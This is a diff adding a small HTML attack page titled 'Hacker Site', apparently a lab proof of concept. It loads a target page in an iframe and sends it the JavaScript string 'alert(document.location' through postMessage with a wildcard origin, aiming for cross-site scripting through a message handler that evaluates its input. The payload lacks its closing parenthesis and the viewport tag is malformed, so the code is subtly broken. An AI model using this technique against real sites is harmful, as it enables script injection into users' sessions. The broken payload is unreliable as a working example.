@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=, initial-scale=1.0">
+    <title>Hacker Site</title>
+</head>
+<body>
+    
+    <iframe id="alvo"></iframe>
+
+    <script>
+        var alvo = document.getElementById('alvo')
+
+        alvo.addEventListener('load', () =>{
+            alvo.contentWindow.postMessage('alert(document.location', '*')
+        })
+
+        alvo.src = '../'
+    </script>
+</body>
+</html>
